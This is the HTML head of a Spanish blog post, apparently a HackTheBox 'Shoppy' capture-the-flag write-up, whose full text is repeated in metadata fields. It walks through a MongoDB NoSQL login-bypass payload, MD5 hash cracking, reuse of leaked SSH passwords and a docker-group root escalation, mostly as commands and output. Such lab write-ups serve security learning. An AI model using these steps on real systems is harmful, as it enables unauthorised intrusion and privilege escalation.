<!DOCTYPE html>













<html lang="es-ES"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  
    

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Shoppy WriteUp" />
<meta name="author" content="H4ckerLite" />
<meta property="og:locale" content="es_ES" />
<meta name="description" content="Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker. Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04 Initiating SYN Stealth Scan at 11:59 Scanning 10.10.11.180 [65535 ports] Discovered open port 80/tcp on 10.10.11.180 Discovered open port 22/tcp on 10.10.11.180 Discovered open port 9093/tcp on 10.10.11.180 Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports) Nmap scan report for 10.10.11.180 Host is up, received user-set (0.16s latency). Scanned at 2023-01-15 11:59:53 -04 for 16s Not shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 9093/tcp open copycat syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.180 shoppy.htb&quot; | tee -a /etc/hosts Ahora debemos ver una web con una cuenta regresiva, nada importante Enumeración Enumerando directorios con WFUZZ nos encontramos lo siguiente. Nota: Debes tener clonado el repositorio de SecList 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://shoppy.htb/FUZZ Total requests: 220560 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000053: 200 25 L 62 W 1074 Ch &quot;login&quot; 000000016: 301 10 L 16 W 179 Ch &quot;images&quot; 000000291: 301 10 L 16 W 179 Ch &quot;assets&quot; 000000259: 302 0 L 4 W 28 Ch &quot;admin&quot; Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque. Login Shoppy Introducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble. Login Shoppy Podemos seguir probando tipicas SQL injection, pero al final ninguna funcionará. 1 2 3 4 &#39; &#39;-- - &#39; or &#39;1&#39;=&#39;1 &#39; or &#39;1&#39;=&#39;1&#39;-- - Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y este otro blog No SQl injection. Podemos probar admin&#39;||&#39;1==1 y poner cualquier contraseña: Bypass Login Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección. Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john 1 2 3 4 5 6 7 8 9 10 11 12 echo &quot;admin:23c6877d9e2b564ef8b32c3a23de27b2&quot; &gt; hashes echo &quot;josh:6ebcea65320589ca4f2f1ce039975995&quot; &gt;&gt; hashes ❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5 Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status remembermethisway (josh) 1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s fuckyooh21..*7¡Vamos! Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably Session completed Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode =============================================================== Found: mattermost.shoppy.htb (Status: 200) [Size: 3122] Progress: 52985 / 100001 (52.98%) Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts. Al entrar en el web nos encontramos con esto Login Mattermost Viendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos. Information leaked 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ❯ ssh jaeger@10.10.11.180 jaeger@10.10.11.180&#39;s password: Sh0ppyBest@pp! Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26 manpath: can&#39;t set the locale; make sure $LC_* and $LANG are correct jaeger@shoppy:~$ export TERM=xterm jaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable. Enumeración del sistema 1 2 3 4 5 6 7 8 9 jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Sh0ppyBest@pp! Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager jaeger@shoppy:~$ Intentamos ejecutar el comando 1 2 3 4 5 jaeger@shoppy:~$ sudo -u deploy /home/deploy/passw* Welcome to Josh password manager! Please enter your master password: Password Access denied! This incident will be reported ! jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy Password-Manager 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! jaeger@shoppy:~$ Podemos migrar al usuario Deploy . 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ su deploy Password: Deploying@pp! $ bash deploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) deploy@shoppy:/home/jaeger$ Escalada de privilegios Pertenecemos al grupo docker mirando GtfObins podemos ver que podemos abusar del grupo docker Ejecutamos el comando nos da una shell como root. 1 2 deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash root@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las flags respectivas para cada usuario. 1 2 3 4 5 root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66 root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67 root@3ea87a82734f:~#" />
<meta property="og:description" content="Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker. Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04 Initiating SYN Stealth Scan at 11:59 Scanning 10.10.11.180 [65535 ports] Discovered open port 80/tcp on 10.10.11.180 Discovered open port 22/tcp on 10.10.11.180 Discovered open port 9093/tcp on 10.10.11.180 Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports) Nmap scan report for 10.10.11.180 Host is up, received user-set (0.16s latency). Scanned at 2023-01-15 11:59:53 -04 for 16s Not shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 9093/tcp open copycat syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.180 shoppy.htb&quot; | tee -a /etc/hosts Ahora debemos ver una web con una cuenta regresiva, nada importante Enumeración Enumerando directorios con WFUZZ nos encontramos lo siguiente. Nota: Debes tener clonado el repositorio de SecList 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://shoppy.htb/FUZZ Total requests: 220560 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000053: 200 25 L 62 W 1074 Ch &quot;login&quot; 000000016: 301 10 L 16 W 179 Ch &quot;images&quot; 000000291: 301 10 L 16 W 179 Ch &quot;assets&quot; 000000259: 302 0 L 4 W 28 Ch &quot;admin&quot; Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque. Login Shoppy Introducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble. Login Shoppy Podemos seguir probando tipicas SQL injection, pero al final ninguna funcionará. 1 2 3 4 &#39; &#39;-- - &#39; or &#39;1&#39;=&#39;1 &#39; or &#39;1&#39;=&#39;1&#39;-- - Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y este otro blog No SQl injection. Podemos probar admin&#39;||&#39;1==1 y poner cualquier contraseña: Bypass Login Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección. Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john 1 2 3 4 5 6 7 8 9 10 11 12 echo &quot;admin:23c6877d9e2b564ef8b32c3a23de27b2&quot; &gt; hashes echo &quot;josh:6ebcea65320589ca4f2f1ce039975995&quot; &gt;&gt; hashes ❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5 Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status remembermethisway (josh) 1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s fuckyooh21..*7¡Vamos! Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably Session completed Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode =============================================================== Found: mattermost.shoppy.htb (Status: 200) [Size: 3122] Progress: 52985 / 100001 (52.98%) Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts. Al entrar en el web nos encontramos con esto Login Mattermost Viendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos. Information leaked 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ❯ ssh jaeger@10.10.11.180 jaeger@10.10.11.180&#39;s password: Sh0ppyBest@pp! Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26 manpath: can&#39;t set the locale; make sure $LC_* and $LANG are correct jaeger@shoppy:~$ export TERM=xterm jaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable. Enumeración del sistema 1 2 3 4 5 6 7 8 9 jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Sh0ppyBest@pp! Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager jaeger@shoppy:~$ Intentamos ejecutar el comando 1 2 3 4 5 jaeger@shoppy:~$ sudo -u deploy /home/deploy/passw* Welcome to Josh password manager! Please enter your master password: Password Access denied! This incident will be reported ! jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy Password-Manager 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! jaeger@shoppy:~$ Podemos migrar al usuario Deploy . 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ su deploy Password: Deploying@pp! $ bash deploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) deploy@shoppy:/home/jaeger$ Escalada de privilegios Pertenecemos al grupo docker mirando GtfObins podemos ver que podemos abusar del grupo docker Ejecutamos el comando nos da una shell como root. 1 2 deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash root@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las flags respectivas para cada usuario. 1 2 3 4 5 root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66 root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67 root@3ea87a82734f:~#" />
<link rel="canonical" href="http://localhost:4000/posts/shoppy-writeup/" />
<meta property="og:url" content="http://localhost:4000/posts/shoppy-writeup/" />
<meta property="og:site_name" content="H4ckerLite" />
<meta property="og:image" content="http://localhost:4000/assets/img/commons/shoppy-writeup/Shoppy.png" />
<meta property="og:image:alt" content="Shoppy WriteUp" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-13T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/shoppy-writeup/Shoppy.png" />
<meta name="twitter:image:alt" content="Shoppy WriteUp" />
<meta property="twitter:title" content="Shoppy WriteUp" />
<meta name="twitter:site" content="@mortzelo" />
<meta name="twitter:creator" content="@H4ckerLite" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-01-17T00:21:21+01:00","datePublished":"2023-01-13T17:00:00+01:00","description":"Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker. Escaneo NMAP Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04 Initiating SYN Stealth Scan at 11:59 Scanning 10.10.11.180 [65535 ports] Discovered open port 80/tcp on 10.10.11.180 Discovered open port 22/tcp on 10.10.11.180 Discovered open port 9093/tcp on 10.10.11.180 Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports) Nmap scan report for 10.10.11.180 Host is up, received user-set (0.16s latency). Scanned at 2023-01-15 11:59:53 -04 for 16s Not shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 9093/tcp open copycat syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB) Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente: 1 echo &quot;10.10.11.180 shoppy.htb&quot; | tee -a /etc/hosts Ahora debemos ver una web con una cuenta regresiva, nada importante Enumeración Enumerando directorios con WFUZZ nos encontramos lo siguiente. Nota: Debes tener clonado el repositorio de SecList 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://shoppy.htb/FUZZ Total requests: 220560 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000053: 200 25 L 62 W 1074 Ch &quot;login&quot; 000000016: 301 10 L 16 W 179 Ch &quot;images&quot; 000000291: 301 10 L 16 W 179 Ch &quot;assets&quot; 000000259: 302 0 L 4 W 28 Ch &quot;admin&quot; Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque. Login Shoppy Introducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble. Login Shoppy Podemos seguir probando tipicas SQL injection, pero al final ninguna funcionará. 1 2 3 4 &#39; &#39;-- - &#39; or &#39;1&#39;=&#39;1 &#39; or &#39;1&#39;=&#39;1&#39;-- - Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y este otro blog No SQl injection. Podemos probar admin&#39;||&#39;1==1 y poner cualquier contraseña: Bypass Login Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección. Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john 1 2 3 4 5 6 7 8 9 10 11 12 echo &quot;admin:23c6877d9e2b564ef8b32c3a23de27b2&quot; &gt; hashes echo &quot;josh:6ebcea65320589ca4f2f1ce039975995&quot; &gt;&gt; hashes ❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5 Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status remembermethisway (josh) 1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s fuckyooh21..*7¡Vamos! Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably Session completed Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode =============================================================== Found: mattermost.shoppy.htb (Status: 200) [Size: 3122] Progress: 52985 / 100001 (52.98%) Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts. Al entrar en el web nos encontramos con esto Login Mattermost Viendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos. Information leaked 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ❯ ssh jaeger@10.10.11.180 jaeger@10.10.11.180&#39;s password: Sh0ppyBest@pp! Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26 manpath: can&#39;t set the locale; make sure $LC_* and $LANG are correct jaeger@shoppy:~$ export TERM=xterm jaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable. Enumeración del sistema 1 2 3 4 5 6 7 8 9 jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Sh0ppyBest@pp! Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager jaeger@shoppy:~$ Intentamos ejecutar el comando 1 2 3 4 5 jaeger@shoppy:~$ sudo -u deploy /home/deploy/passw* Welcome to Josh password manager! Please enter your master password: Password Access denied! This incident will be reported ! jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy Password-Manager 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! jaeger@shoppy:~$ Podemos migrar al usuario Deploy . 1 2 3 4 5 6 7 8 jaeger@shoppy:~$ su deploy Password: Deploying@pp! $ bash deploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) deploy@shoppy:/home/jaeger$ Escalada de privilegios Pertenecemos al grupo docker mirando GtfObins podemos ver que podemos abusar del grupo docker Ejecutamos el comando nos da una shell como root. 1 2 deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash root@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las flags respectivas para cada usuario. 1 2 3 4 5 root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66 root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67 root@3ea87a82734f:~#","headline":"Shoppy WriteUp","image":{"alt":"Shoppy WriteUp","url":"http://localhost:4000/assets/img/commons/shoppy-writeup/Shoppy.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/shoppy-writeup/"},"url":"http://localhost:4000/posts/shoppy-writeup/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Shoppy WriteUp | H4ckerLite
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="H4ckerLite">
<meta name="application-name" content="H4ckerLite">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
